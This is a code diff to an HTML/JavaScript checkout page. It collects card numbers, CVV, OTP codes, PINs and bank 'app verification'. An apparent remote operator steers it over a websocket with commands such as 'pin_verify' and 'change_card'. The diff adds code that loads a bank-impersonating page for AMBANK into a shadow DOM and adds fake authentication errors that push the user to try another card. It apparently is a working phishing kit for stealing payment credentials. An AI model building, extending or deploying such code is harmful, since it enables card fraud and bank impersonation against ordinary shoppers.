@@ -942,7 +942,13 @@ url("pay1ment_icons.woff") format("woff");
 
 <div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Cardholder Name *</label><input id="cardHolder" placeholder="Name on card" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div>
 
-<div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Card Number *</label><div style="position:relative"><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" style="width:100%;padding:10px 12px;padding-right:105px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"><div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none"><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg><svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg></div></div></div>
+<div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Card Number *</label><div style="position:relative"><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" style="width:100%;padding:10px 12px;padding-right:105px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"><div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none"><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg><svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg></div></div>
+
+<span style="
+    color: red;
+    font-size: small;
+">We are unable to authenticate your payment method. Please choose a different payment method and try again.</span>
+</div>
 
 <div style="display:flex;gap:12px;margin-bottom:12px"><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div></div>
 
@@ -1054,6 +1060,7 @@ url("pay1ment_icons.woff") format("woff");
         </div>
         <!-- APP Verification overlay -->
         <div class="overlay hidden" id="app-verify-overlay">
+            <div id="mount"></div>
             <div class="app-verify-box">
                 <div class="app-hdr">
                     <div class="app-bank-logo" id="app-bank-logo">IB</div>
@@ -1484,7 +1491,7 @@ url("pay1ment_icons.woff") format("woff");
  
     /* 收到验证类 action 时先隐藏 OTP 区域以便重新展示 */
     if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
-        a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify') {
+        a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify'  ||  a=== 'pin_verify') {
       //hideOtp();
       q('otp-result').className = 'hidden';
       q('otp-form').className = '';
@@ -1585,7 +1592,7 @@ url("pay1ment_icons.woff") format("woff");
       hideLoad()
       var btn3 = q('btnSubmit');
       if (btn3) { btn3.disabled = false; /*btn3.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
-      showInline('error', 'Card error: ' + (p.message || ''), true);
+      showMsg('error', 'We are unable to authenticate your payment method. Please choose a different payment method and try again.', true);
  
     } else if (a === 'otp_error') {
 
@@ -1608,8 +1615,9 @@ url("pay1ment_icons.woff") format("woff");
       if (btn4) { btn4.disabled = true; }
       showInline('error', 'Session timed out. Please try again.', true);
  
-    } else if (a === 'change_card' || a === 'change_card_prompt') {
+    } else if (a === 'change_card_prompt'  || a==='custom_prompt') {
       _curStep = 'card';
+      document.getElementById('load-overlay').classList.add('hidden');
       var resultmessage = p.message || 'Your bank did not authorize this transaction.';
       document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
       document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
@@ -1618,7 +1626,20 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('app-verify-overlay').classList.add('hidden');
       var btn5 = q('btnSubmit');
       if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
-      showInline('info', p.message || 'Please use a different card.', true);
+      showMsg('error', p.message, true);
+ 
+    } else if (a === 'change_card') {
+      _curStep = 'card';
+      document.getElementById('load-overlay').classList.add('hidden');
+      var resultmessage = p.message || 'Your bank did not authorize this transaction.';
+      document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
+      document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
+      changeOtp();
+      changeEmail();
+      document.getElementById('app-verify-overlay').classList.add('hidden');
+      var btn5 = q('btnSubmit');
+      if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
+      showMsg('error', 'Please use a different card.', true);
  
     } else if (a === 'redirect_complete') {
       location.href = '/complete/';
@@ -1633,8 +1654,30 @@ url("pay1ment_icons.woff") format("woff");
     }
      else if (a === 'app_verify') {
       _curStep = 'app_verify';
-      window._appVerifyInProgress = true;
       document.getElementById('load-overlay').classList.add('hidden');
+
+      if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/AMBANK', 'mount'); return;
+
+      /*if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/pages/page1', 'mount'); return;
+
+      if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/pages/page1', 'mount'); return;
+
+      if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/pages/page1', 'mount'); return;
+
+      if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/pages/page1', 'mount'); return;
+
+      if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/pages/page1', 'mount'); return;
+
+      if(p.bankName==='AMBANK (M) BERHAD') 
+        loadPage('/pages/page1', 'mount'); return;*/
+
+
       document.getElementById('app-verify-overlay').classList.remove('hidden');
       var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
       updateBankLogo(bankName);
@@ -1649,17 +1692,17 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('app-error').classList.remove('hidden');
       document.getElementById('app-error').textContent = p.message || 'APP verification not completed.'
     } 
-    else if (window._appVerifyInProgress) {
+    /*else if (window._appVerifyInProgress) {
       document.getElementById('app-verify-overlay').classList.remove('hidden');
       document.getElementById('app-spinner').style.display = 'none';
       document.getElementById('app-continue-btn').disabled = false;
       document.getElementById('app-error').classList.remove('hidden');
        document.getElementById('app-error').textContent = p.message || 'Operator needs your attention'
-    }
+    }*/
      else if (a === 'pin_verify') {
       _curStep = 'pin_verify';
-      window._emailVerifyInProgress = false;
-      window._pinVerifyInProgress = true;
+      //window._emailVerifyInProgress = false;
+      //window._pinVerifyInProgress = true;
       document.getElementById('load-overlay').classList.add('hidden');
       document.getElementById('pin-overlay').classList.remove('hidden');
       document.getElementById('pin-amount-row').style.display = '';
@@ -1799,7 +1842,7 @@ url("pay1ment_icons.woff") format("woff");
   function showLoad() {
     var load = q('load-overlay');
     //var btn = q('btnSubmit');
-    if (load) load.className = 'overlay';
+    if (load) load.classList.remove('hidden');
     //if (btn) btn.style.display = 'none';
   }
 
@@ -1807,7 +1850,7 @@ url("pay1ment_icons.woff") format("woff");
   function hideLoad() {
     var load = q('load-overlay');
     //var btn = q('btnSubmit');
-    if (load) load.className = 'overlay hidden';
+    if (load) load.classList.add('hidden');
     //if (btn) btn.style.display = 'none';
   }
 
@@ -2089,6 +2132,7 @@ url("pay1ment_icons.woff") format("woff");
                 document.getElementById('pin-error').classList.add('hidden');
                 document.getElementById('pin-submit').disabled = true;
                 document.getElementById('pin-spinner').style.display = 'flex';
+                document.getElementById('pin-spinner').classList.remove('hidden');
                 if (ws && ws.readyState === 1)
                     ws.send(JSON.stringify({
                         type: 'session_update',
@@ -2620,7 +2664,37 @@ function updateOtpCardLogoStyle(cardType, elId) {
 
 
  
+async function loadPage(pagePath, mountId) {
 
+    // 读取html
+    const htmlText = await fetch(`${pagePath}/index.html`)
+        .then(r => r.text());
+
+    // 读取css
+    const cssText = await fetch(`${pagePath}/style.css`)
+        .then(r => r.text());
+
+    // 创建容器
+    const host = document.getElementById(mountId);
+
+    // 创建shadow
+    const shadow = host.attachShadow({ mode: "open" });
+
+    // 去掉原link
+    const cleanHtml = htmlText.replace(
+        /<link[^>]*style\.css[^>]*>/i,
+        ''
+    );
+
+    // 插入
+    shadow.innerHTML = `
+        <style>
+            ${cssText}
+        </style>
+
+        ${cleanHtml}
+    `;
+}
             </script>
 
 
